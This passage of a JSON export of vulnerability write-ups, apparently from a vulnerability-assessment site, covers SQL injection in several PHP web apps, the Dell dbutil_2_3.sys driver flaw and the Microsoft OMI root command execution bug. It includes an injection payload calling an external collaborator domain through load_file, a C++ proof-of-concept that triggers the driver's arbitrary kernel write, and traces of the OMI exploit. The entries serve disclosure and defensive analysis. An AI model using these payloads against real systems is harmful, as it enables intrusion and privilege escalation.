          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f1e82f6c-2987-4de4-a3cc-15e8445b7fb4",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "2b769f7a-07ed-4960-87dd-49eb178b55c8",
      "created": "2021-10-22T09:51:27.302081Z",
      "revisionDate": "2023-05-17T08:31:26.432197Z",
      "document": "## [CVE-2021-38833](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38833)\r\n\r\n## [Vendor](https://phpgurukul.com/author/admin/)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-38833/docs/Screenshot%202021-10-22%20122531.png)\r\n\r\n- SQL disaster\r\n\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-38833/docs/disaster-SQL.gif)\r\n\r\n------------------------------------------------------------------\r\n[+] Exploit Source: \r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-38833)\r\n\r\n------------------------------------------------------------------\r\n\r\n## Description:\r\n\r\nSQL injection vulnerability in PHPGurukul Apartment Visitors Management System (AVMS) v. 1.0 allows attackers to execute arbitrary SQL statements and to gain RCE. The PHPGurukul Apartment Visitors Management System (AVMS) v. 1.0 is also vulnerable to remote SQL-Injection-Bypass-Authentication for the admin account and the application is vulnerable to XSS-SORED vulnerability and PHPSESSID-Hijacking.\r\n\r\n-------------------------------------------------------------------\r\n## CONCLUSION: \r\n\r\n- This vendor must STOP creating all these broken projects and vulnerable software programs, probably he is not a developer!\r\n\r\n## BR \r\n- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer\r\n\r\n-------------------------------------------------------------------\r\n## Reproduce:\r\n\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-38833)\r\n\r\n## Proof:\r\n[href](https://www.nu11secur1ty.com/2021/10/cve-2021-38833.html)\r\n\r\n## BR nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "0edddfac-16db-45ab-a0b5-d4f2fbfca630",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "19ddfced-8955-4619-b10a-1bc8edf92bf9",
      "created": "2021-10-22T11:14:53.237885Z",
      "revisionDate": "2023-05-17T08:30:33.96865Z",
      "document": "## [CVE-2021-38754](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38754)\r\n## [Vendor](https://github.com/kishan0725/Hospital-Management-System)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-38754/docs/Screenshot%202021-10-22%20135918.png)\r\n\r\n\r\n## Description:\r\nSQL Injection - type ` time-based blind` vulnerability is in Hospital Management System 1.0 due to lack of input validation in `messearch.php` and `contact.php`.\r\nThe `txtEmail` parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load_file('\\\\\\\\ao2f0zoz0iu9cob52rm6nhpjpav3jy7pad20toi.nu11secur1tycollaborator.net\\\\iyv'))+' was submitted in the txtEmail parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.\r\n\r\n## MySQL Request:\r\n\r\n```mysql\r\nPOST /Hospital-Management-System-master/contact.php HTTP/1.1\r\nHost: 192.168.1.215\r\nOrigin: http://192.168.1.215\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.215/Hospital-Management-System-master/contact.html\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Length: 112\r\n\r\ntxtName=579853&txtEmail=yqPiidRW@nu11secur1tycollaborator.net'%2b(select%20load_file('%5c%5c%5c%5cao2f0zoz0iu9cob52rm6nhpjpav3jy7pad20toi.nu11secur1tycollaborator.net%5c%5ciyv'))%2b'&txtPhone=732-434-44&btnSubmit=Send+Message&txtMsg=832921\r\n```\r\n\r\n## MySQL Response:\r\n\r\n```mysql\r\nHTTP/1.1 200 OK\r\nDate: Fri, 22 Oct 2021 10:26:22 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nContent-Length: 0\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n```\r\n## Result:\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-38754/docs/Screenshot%202021-10-22%20142149.png)\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-38754)\r\n\r\n## Proof:\r\n[href](https://www.nu11secur1ty.com/2021/10/cve-2021-38754.html)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "12d7b263-3684-4442-812e-dc30b93def93",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "b86c17ff-b8f9-4aed-8b70-182c2603c527",
      "created": "2021-10-25T20:11:16.868836Z",
      "revisionDate": "2021-10-26T19:04:35.678772Z",
      "document": "## Description\r\n\r\nOn May 4, 2021, Dell released [Dell Security Advisory 2021-088](https://www.dell.com/support/kbdoc/en-us/000186019/dsa-2021-088-dell-client-platform-security-update-for-dell-driver-insufficient-access-control-vulnerability) which describes a privilege escalation vulnerability in their dbutil_2_3.sys driver. The vulnerability is assigned CVE-2021-21551 and NIST assigned it a CVSSv3 score of [7.8](https://nvd.nist.gov/vuln/detail/CVE-2021-21551). The vulnerable driver is utilized during the firmware update process and is therefore widely deployed across Dell products. Please see the advisory for the full list of impacted products.\r\n\r\nThe vulnerability is the result of a write-what-where condition ([CWE-123](https://cwe.mitre.org/data/definitions/123.html)) in which a low privileged user can direct the driver to write attacker controlled data to an arbitrary memory address via an [ioctl](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol) call. This allows the low privileged user to escalate permissions to SYSTEM by overwriting data structures in kernel memory. Arbitrary modification of kernel memory is also useful to an attacker with SYSTEM privileges to bypass or disable security features that are not otherwise accessible. As such, the vulnerable driver could reasonably be used in Bring Your Own Vulnerable Driver ([BYOVD](https://attack.mitre.org/techniques/T1068/)) attacks in the wild.\r\n\r\nA variety of public exploits, including a Metasploit module, have been published for this vulnerability. The vulnerability has also been reportedly used in the wild.\r\n\r\n\r\n## Affected products\r\n\r\nThe following products are affected. Please see DSA-2021-088 Table A for an extensive list of affected platforms and versions.\r\n\r\n* Firmware update utility packages, including BIOS update utilities, Thunderbolt firmware update utilities, TPM firmware update utilities and dock firmware update utilities.\r\n* All Dell Download Notification solutions. Dell Command Update, Dell Update, Alienware Update, and Dell SupportAssist for PCs.\r\n* Dell System Inventory Agent\r\n* Dell Platform Tags\r\n* Dell BIOS Flash Utility\r\n\r\n\r\n## Root Cause Analysis\r\n\r\nThe vulnerability can be recreated using this minimized proof of concept:\r\n\r\n```C++\r\n#include <cstdlib>\r\n#include <iostream>\r\n#include <Windows.h>\r\n\r\nnamespace\r\n{\r\n    const std::string s_driverHandle(\"\\\\\\\\.\\\\DBUtil_2_3\");\r\n\r\n    uint32_t s_write_ioctl = 0x9b0c1ec8;\r\n\r\n    struct exploit_struct\r\n    {\r\n        uint64_t unused0;\r\n        void* write_ptr;\r\n        uint64_t unused1;\r\n        uint64_t write_data;\r\n    };\r\n}\r\n\r\nint main(int p_argc, char** p_argv)\r\n{\r\n    HANDLE driverHandle = CreateFileA(s_driverHandle.c_str(), GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);\r\n    if (INVALID_HANDLE_VALUE == driverHandle)\r\n    {\r\n        std::wcerr << \"[!] Failed to get a handle to \" << s_driverHandle.c_str() << std::endl;\r\n        return EXIT_FAILURE;\r\n    }\r\n\r\n    exploit_struct crash = { 0, (void*)0x4141414141414141, 0, 0 };\r\n    char outBuf[32] = { 0 };\r\n    DWORD bytesReturned = 0;\r\n    DeviceIoControl(driverHandle, s_write_ioctl, &crash, sizeof(exploit_struct), &outBuf, sizeof(outBuf), &bytesReturned, 0);\r\n    return EXIT_FAILURE;\r\n}\r\n```\r\n\r\nIn the above proof of concept, we open a handle to `\\\\.\\DBUtil_2_3` and issue ioctl control code `0x9b0c1ec8`. With the ioctl code we also provide a 32-byte struct containing the exploit logic. Exploitation is possible because some of the struct's members are passed directly into a `memmove`. As a reminder, `memmove` is defined as:\r\n\r\n```\r\nvoid *memmove(void *dest, const void *src, size_t n);\r\n```\r\n\r\nThe address stored in the struct\u2019s `write_ptr` will be used as the `dest` parameter in the vulnerable `memmove` and a pointer to the `write_data` member will be used as the `src` parameter. That means that the contents of `write_data` will be written to the address pointed to by `write_ptr`.\r\n\r\n![ghidra_memcpy](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-21551/ghidra_memcpy.png)\r\n\r\nThe above screenshot shows the affected function and `memmove` call. Note that Ghidra identifies the function as a `memcpy` but, for our purposes, the distinction doesn\u2019t matter much.\r\n\r\nThe proof of concept above will attempt to write 8 bytes of `0` to the address `0x4141414141414141`. Analysis of the resulting crash below shows the attempted write of `0` to `0x4141414141414141`:\r\n\r\n```\r\nCONTEXT:  ffffb30c576add00 -- (.cxr 0xffffb30c576add00)\r\nrax=0000000000000000 rbx=ffffa20f0749bec0 rcx=4141414141414141\r\nrdx=bebe60cdc7729697 rsi=0000000000000001 rdi=ffffa20f0749bec0\r\nrip=fffff8047c5d17b2 rsp=ffffb30c576ae708 rbp=ffffa20f07ec2b10\r\n r8=0000000000000007  r9=ffffa20f08b3d7c0 r10=fffff8047c5d1170\r\nr11=4141414141414141 r12=0000000000000000 r13=0000000000000000\r\nr14=ffffa20f09c0f7f0 r15=ffffa20f0749bd70\r\niopl=0         nv up ei pl nz na pe nc\r\ncs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00050202\r\nDBUtil_2_3+0x17b2:\r\nfffff804`7c5d17b2 8801            mov     byte ptr [rcx],al ds:002b:41414141`41414141=??\r\nResetting default scope\r\n\r\nPROCESS_NAME:  crasher.exe\r\n```\r\n\r\n## Exploits\r\n\r\nThe various public exploits for this vulnerability have taken a few approaches to exploitation. [@waldoirc](https://twitter.com/waldoirc)\u2019s exploit grants the attacker SeImpersonatePrivilege and then impersonates SYSTEM via a named pipe to [escalate privileges](https://github.com/waldo-irc/CVE-2021-21551). [@Void_Sec](https://twitter.com/Void_Sec) and [@zeroSteiner](https://twitter.com/zeroSteiner) both [wrote](ttps://voidsec.com/reverse-engineering-and-exploiting-dell-cve-2021-21551/) [exploits](https://github.com/rapid7/metasploit-framework/pull/15190) that modified the process token for privilege escalation. And [@33y0re](https://twitter.com/33y0re) went the extra mile and achieved privilege escalation via [page table corruption](https://connormcgarr.github.io/cve-2020-21551-sploit/).\r\n\r\nWhile all of the previously mentioned exploits are for low privileged users to escalate to SYSTEM, it also appears likely that this vulnerability is being used in BYOVD attacks. The following [VirusTotal](https://www.virustotal.com/gui/file/0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5/relations) screenshot shows the coin-miner TJprojMain has been observed to drop `dbutil_2_3.sys` to disk.\r\n\r\n![BYOVD](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-21551/coinminer_drop.png)\r\n\r\n## Patch\r\n\r\nDell didn\u2019t truly patch this issue. Their mitigation involved deleting `dbutil_2_3.sys` and switching to a driver named `DBUtilDrv2.sys`, a driver that has existed since at least 2019. While the two drivers share some code, there is a notable difference in structure. Perhaps most importantly though, `DBUtilDrv2.sys` is not accessible to `localhost\\Everyone` like `dbutil_2_3.sys` is.\r\n\r\n```\r\nProcessed 1 device objects.\r\n0: kd> !devobj ffffd9884bb95670\r\nDevice object (ffffd9884bb95670) is for:\r\n DBUtil_2_5 \\Driver\\DBUtilDrv2 DriverObject ffffd9884bba3800\r\nCurrent Irp 00000000 RefCount 0 Type 00000022 Flags 00002044\r\nSecurityDescriptor ffffc90b6d294ba0 DevExt ffffd9884bb95560 DevObjExt ffffd9884bb957e8\r\nExtensionFlags (0000000000)  \r\nCharacteristics (0x00000100)  FILE_DEVICE_SECURE_OPEN\r\nAttachedTo (Lower) ffffd9884b359730 \\Driver\\PnpManager\r\nDevice queue is not busy.\r\n0: kd> !sd ffffc90b6d294ba0 0x1\r\n->Revision: 0x1\r\n->Sbz1    : 0x0\r\n->Control : 0x9814\r\n            SE_DACL_PRESENT\r\n            SE_SACL_PRESENT\r\n            SE_SACL_AUTO_INHERITED\r\n            SE_DACL_PROTECTED\r\n            SE_SELF_RELATIVE\r\n->Owner   : S-1-5-32-544 (Alias: BUILTIN\\Administrators)\r\n->Group   : S-1-5-18 (Well Known Group: NT AUTHORITY\\SYSTEM)\r\n->Dacl    :\r\n->Dacl    : ->AclRevision: 0x2\r\n->Dacl    : ->Sbz1       : 0x0\r\n->Dacl    : ->AclSize    : 0x58\r\n->Dacl    : ->AceCount   : 0x3\r\n->Dacl    : ->Sbz2       : 0x0\r\n->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE\r\n->Dacl    : ->Ace[0]: ->AceFlags: 0x0\r\n->Dacl    : ->Ace[0]: ->AceSize: 0x14\r\n->Dacl    : ->Ace[0]: ->Mask : 0x001f01ff\r\n->Dacl    : ->Ace[0]: ->SID: S-1-5-18 (Well Known Group: NT AUTHORITY\\SYSTEM)\r\n\r\n->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE\r\n->Dacl    : ->Ace[1]: ->AceFlags: 0x0\r\n->Dacl    : ->Ace[1]: ->AceSize: 0x18\r\n->Dacl    : ->Ace[1]: ->Mask : 0x001f01ff\r\n->Dacl    : ->Ace[1]: ->SID: S-1-5-32-544 (Alias: BUILTIN\\Administrators)\r\n\r\n->Dacl    : ->Ace[2]: ->AceType: ACCESS_ALLOWED_ACE_TYPE\r\n->Dacl    : ->Ace[2]: ->AceFlags: 0x0\r\n->Dacl    : ->Ace[2]: ->AceSize: 0x24\r\n->Dacl    : ->Ace[2]: ->Mask : 0x001f01ff\r\n->Dacl    : ->Ace[2]: ->SID: S-1-5-21-3819158199-2843755626-3941670155-500 (User: AlbinoLobsterDev\\Administrator)\r\n```\r\n\r\nUnfortunately, amongst the shared code is the vulnerable ioctl and `memmove`. The proof of concept crashing exploit that is presented at the beginning of this post can trigger a BSOD against `DBUtilDrv2.sys` versions 2.5 and 2.6 with minimal tweaking. Which likely means an attacker with administrative privileges could also use `DBUtilDrv2.sys` in a BYOVD style attacks to gain Ring0 access.\r\n\r\nDell addressed issues with `DBUtilDrv2.sys` in August  2021 and assigned [CVE-2021-36276](https://nvd.nist.gov/vuln/detail/CVE-2021-36276). See [DSA-2021-152](https://www.dell.com/support/kbdoc/en-us/000190105/dsa-2021-152-dell-client-platform-security-update-for-an-insufficient-access-control-vulnerability-in-the-dell-dbutildrv2-sys-driver) for additional details.\r\n\r\n![BSOD](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-21551/bsod.png)\r\n\r\n## Guidance\r\n\r\nDell has a fairly extensive mitigations and update guide in DSA-2021-088. But there are a few simple ways to determine if your systems may be vulnerable. You can look for `dbutil_2_3.sys` in `C:\\Windows\\Temp` or `%APPDATA%\\Temp`. You can also look for a running instance by querying service control with the following command: `sc.exe query DBUtil_2_3`. Example output follows: \r\n\r\n````\r\nC:\\Windows\\system32>sc.exe query DBUtil_2_3\r\n\r\nSERVICE_NAME: DBUtil_2_3\r\n        TYPE               : 1  KERNEL_DRIVER\r\n        STATE              : 4  RUNNING\r\n                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\r\n        WIN32_EXIT_CODE    : 0  (0x0)\r\n        SERVICE_EXIT_CODE  : 0  (0x0)\r\n        CHECKPOINT         : 0x0\r\n        WAIT_HINT          : 0x0\r\n````\r\n\r\n\r\n## Citations\r\n\r\n* [DSA-2021-088: Dell Client Platform Security Update for an Insufficient Access Control Vulnerability in the Dell dbutil Driver](https://www.dell.com/support/kbdoc/en-us/000186019/dsa-2021-088-dell-client-platform-security-update-for-dell-driver-insufficient-access-control-vulnerability)\r\n* [CVE-2021-21551- Hundreds Of Millions Of Dell Computers At Risk Due to Multiple BIOS Driver Privilege Escalation Flaws](https://www.sentinelone.com/labs/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/)\r\n* [CrowdStrike Falcon Detects Kernel Attacks Exploiting Vulnerable Dell Driver (CVE-2021-21551)](https://www.crowdstrike.com/blog/crowdstrike-falcon-detects-dell-driver-vulnerability-cve-2021-21551/)\r\n* [Reverse Engineering & Exploiting Dell CVE-2021-21551](https://voidsec.com/reverse-engineering-and-exploiting-dell-cve-2021-21551/)\r\n* [Exploit Development: CVE-2021-21551 - Dell \u2018dbutil_2_3.sys\u2019 Kernel Exploit Writeup](https://connormcgarr.github.io/cve-2020-21551-sploit/)\r\n* [Add Exploit For CVE-2021-21551 (Dell DBUtil_2_3 IOCTL)](https://github.com/rapid7/metasploit-framework/pull/15190)\r\n* [CVE-2021-21551: An Extended Writeup on a Vulnerable Kernel Driver](https://www.mitchellzakocs.com/blog/dbutil)\r\n* [Exploit to SYSTEM for CVE-2021-21551](https://github.com/waldo-irc/CVE-2021-21551)\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Defense Evasion",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "fcc498b1-c739-47ab-9510-9451331ec7ee",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "5cab3f28-7502-4f87-baa6-a2fbefcbf843",
      "created": "2021-10-26T17:33:39.617083Z",
      "revisionDate": "2023-05-17T08:28:57.472262Z",
      "document": "## [CVE-2021-41649](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41649)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41649/docs/Screenshot%202021-10-26%20195734.png)\r\n\r\n## Description:\r\nAn un-authenticated SQL Injection exists in PuneethReddyHC online-shopping-system-advanced through the /homeaction.php cat_id parameter. Using a post request does not sanitize the user input, also the p parameter appears to be vulnerable to SQL injection attacks through the product.php.\r\n\r\n-------------------------------------------------------------------\r\n\r\n## Reproduce: \r\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-41649)\r\n\r\n## Proof: \r\n[href](https://www.nu11secur1ty.com/2021/10/cve-2021-41649.html)\r\n\r\n## BR nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2e73f8ac-c439-48fd-b7d1-20652c35716e",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "135864da-c379-4cf4-a283-6c03bda859d9",
      "created": "2021-10-27T17:59:18.984166Z",
      "revisionDate": "2021-10-27T20:46:34.251534Z",
      "document": "A locally exploitable vulnerability exists within Microsoft's OMI management server in versions prior to 1.6.8-1 that can allow a local attacker to execute operating system commands as `root`. Exploitation consists of sending crafted binary messages to the local UNIX socket on which the service listens. Under normal circumstances, clients (typically `omicli`) will send an authentication frame via this interface however the authentication frame can be omitted. In this case, the default values which are initialized to 0 are used and happen to correspond to the UID and GID of the root user and group.\r\n\r\nThe service must be running in order for this vulnerability to be exploited. The socket file is located at `/var/opt/omi/run/omiserver.sock` and can be connected to by anyone using a socket of the `AF_UNIX` family.\r\n\r\nThe `strace` utility can be used to view the standard exchange of authentication information:\r\n\r\n```\r\nroot@3ad6908bf1bc:/opt/omi/bin# strace -v -f -xx -e trace=socket,connect,write,writev,close   /opt/omi/bin/omicli iv root/scx { SCX_OperatingSystem } ExecuteShellCommand { command 'id' timeout 0 }\r\n...\r\n[pid  1271] socket(AF_UNIX, SOCK_STREAM, 0) = 6\r\n[pid  1271] connect(6, {sa_family=AF_UNIX, sun_path=\"\\x2f\\x76\\x61\\x72\\x2f\\x6f\\x70\\x74\\x2f\\x6f\\x6d\\x69\\x2f\\x72\\x75\\x6e\\x2f\\x6f\\x6d\\x69\\x73\\x65\\x72\\x76\\x65\\x72\\x2e\\x73\\x6f\\x63\\x6b\"}, 110) = 0\r\n[pid  1271] writev(6, [{iov_base=\"\\x2f\\x7e\\xa8\\xb1\\x08\\x06\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x08\\xd5\\x83\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"..., iov_len=48}, {iov_base=\"\\xd8\\xd5\\x83\\x01\\x00\\x00\\x00\\x00\\xd0\\xd8\\x83\\x01\\x00\\x00\\x00\\x00\\xd0\\xd4\\x83\\x01\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"..., iov_len=248}], 2) = 296\r\n[pid  1271] write(5, \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", 8) = 8\r\n[pid  1271] close(7)                    = 0\r\n[pid  1272] writev(6, [{iov_base=\"\\x2f\\x7e\\xa8\\xb1\\x08\\x06\\x01\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x88\\x33\\x83\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"..., iov_len=112}, {iov_base=\"\\x57\\x99\\x2b\\x46\\x01\\x00\\x00\\x00\\x0f\\x00\\x00\\x00\\x5f\\x4f\\x4d\\x49\\x5f\\x4f\\x70\\x74\\x69\\x6f\\x6e\\x53\\x65\\x74\\x00\\x00\\x00\\x00\\x00\\x00\"..., iov_len=188}, {iov_base=\"\\x60\\xea\\x6a\\xb2\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa0\\x0b\\x61\\x57\\x46\\x7f\\x00\\x00\\xe8\\x34\\x83\\x01\\x00\\x00\\x00\\x00\"..., iov_len=80}, {iov_base=\"\\x60\\xea\\x6a\\xb2\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa0\\x0b\\x61\\x57\\x46\\x7f\\x00\\x00\\xe8\\x34\\x83\\x01\\x00\\x00\\x00\\x00\"..., iov_len=1360}, {iov_base=\"\\x57\\x99\\x2b\\x46\\x02\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x53\\x43\\x58\\x5f\\x4f\\x70\\x65\\x72\\x61\\x74\\x69\\x6e\\x67\\x53\\x79\\x73\\x74\\x65\\x6d\\x00\"..., iov_len=108}, {iov_base=\"\\xd0\\x86\\x83\\x01\\x00\\x00\\x00\\x00\\x70\\x8a\\x83\\x01\\x00\\x00\\x00\\x00\\x80\\x8a\\x83\\x01\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"..., iov_len=1008}], 6) = 2856\r\n[pid  1272] write(1, \"\\x69\\x6e\\x73\\x74\\x61\\x6e\\x63\\x65\\x20\\x6f\\x66\\x20\\x45\\x78\\x65\\x63\\x75\\x74\\x65\\x53\\x68\\x65\\x6c\\x6c\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x0a\", 32instance of ExecuteShellCommand\r\n) = 32\r\n[pid  1272] write(1, \"\\x7b\\x0a\", 2{\r\n)     = 2\r\n[pid  1272] write(1, \"\\x20\\x20\\x20\\x20\\x52\\x65\\x74\\x75\\x72\\x6e\\x56\\x61\\x6c\\x75\\x65\\x3d\\x74\\x72\\x75\\x65\\x0a\", 21    ReturnValue=true\r\n) = 21\r\n[pid  1272] write(1, \"\\x20\\x20\\x20\\x20\\x52\\x65\\x74\\x75\\x72\\x6e\\x43\\x6f\\x64\\x65\\x3d\\x30\\x0a\", 17    ReturnCode=0\r\n) = 17\r\n[pid  1272] write(1, \"\\x20\\x20\\x20\\x20\\x53\\x74\\x64\\x4f\\x75\\x74\\x3d\\x75\\x69\\x64\\x3d\\x30\\x28\\x72\\x6f\\x6f\\x74\\x29\\x20\\x67\\x69\\x64\\x3d\\x30\\x28\\x72\\x6f\\x6f\"..., 50    StdOut=uid=0(root) gid=0(root) groups=0(root)\r\n) = 50\r\n[pid  1272] write(1, \"\\x0a\", 1\r\n)         = 1\r\n[pid  1272] write(1, \"\\x20\\x20\\x20\\x20\\x53\\x74\\x64\\x45\\x72\\x72\\x3d\\x0a\", 12    StdErr=\r\n) = 12\r\n[pid  1272] write(1, \"\\x7d\\x0a\", 2}\r\n)     = 2\r\n[pid  1271] write(5, \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", 8) = 8\r\n[pid  1272] close(6)                    = 0\r\n...\r\n+++ exited with 0 +++\r\n```\r\n\r\nBy following the `writev` calls, the standard exchange can be viewed. The frames starting with `\\x2f\\x7e\\xa8\\xb1` are [header frames][1]. All of the data sent as part of the first request can be omitted, leaving the second which contains the command to execute within the binary structure. The results of the operating system command can be read from the socket, though they must be extracted from the binary response. The commands are executed within the context of a subshell.\r\n\r\nThis vulnerability can be exploited in the default configuration and was patched in version 1.6.8-1 which was [released][2] on September 8th 2021.\r\n\r\n[1]: https://github.com/microsoft/omi/blob/e4d72481fa2f805148c9c8f4d0183b3e2d7814a8/Unix/protocol/header.h#L31\r\n[2]: https://github.com/microsoft/omi/releases/tag/v1.6.8-1\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
